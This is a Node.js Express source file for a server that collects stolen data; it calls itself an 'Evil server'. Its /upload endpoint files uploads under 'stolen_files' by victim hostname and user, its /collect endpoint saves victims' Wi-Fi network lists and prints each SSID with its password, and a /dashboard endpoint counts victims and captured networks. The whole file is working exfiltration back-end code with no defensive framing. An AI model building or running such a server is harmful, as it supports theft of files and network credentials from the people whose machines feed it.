const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
const morgan = require('morgan');
dotenv.config();
const app = express();
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const hostname = req.body.hostname || 'unknown';
        const user = req.body.user || 'unknown';
        const folderPath = path.join(__dirname, 'stolen_files', hostname, user);
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
        }
        cb(null, folderPath);
    },
    filename: function (req, file, cb) {
        const timestamp = Date.now();
        cb(null, `${timestamp}_${file.originalname}`);
    }
});
const upload = multer({ storage: storage });
app.use(morgan('dev'));
app.use(express.json());
app.post('/upload', upload.array('files', 100), (req, res) => {
    console.log(`[+] Received files from ${req.body.hostname} (${req.body.user})`);
    if (req.files && req.files.length > 0) {
        req.files.forEach(file => {
            console.log(`[+] File saved: ${file.path}`);
        });
    }
    res.status(200).send('Files received successfully');
});
app.post('/collect', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    console.log(`New victim: ${data.victim} (${data.user})`);
    console.log(`Networks captured: ${data.networks.length}`);
    const filename = `stolen_data_${timestamp.replace(/:/g, '-')}.json`;
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    data.networks.forEach(network => {
        console.log(`SSID: ${network.ssid} | Password: ${network.password}`);
    });
    res.json({ 
        status: 'success', 
        message: 'Data received and stored',
        count: data.networks.length 
    });
});
app.get('/dashboard', (req, res) => {
    const files = fs.readdirSync('.').filter(f => f.startsWith('stolen_data_'));
    const allData = files.map(file => {
        return JSON.parse(fs.readFileSync(file, 'utf8'));
    });
    res.json({
        totalVictims: allData.length,
        totalNetworks: allData.reduce((sum, data) => sum + data.networks.length, 0),
        victims: allData.map(d => ({
            system: d.victim,
            user: d.user,
            networks: d.networks.length,
            timestamp: d.timestamp
        }))
    });
});
app.listen(process.env.PORT, "0.0.0.0", () => {
    console.log(`[+] Evil server listening on port ${process.env.PORT}`);
});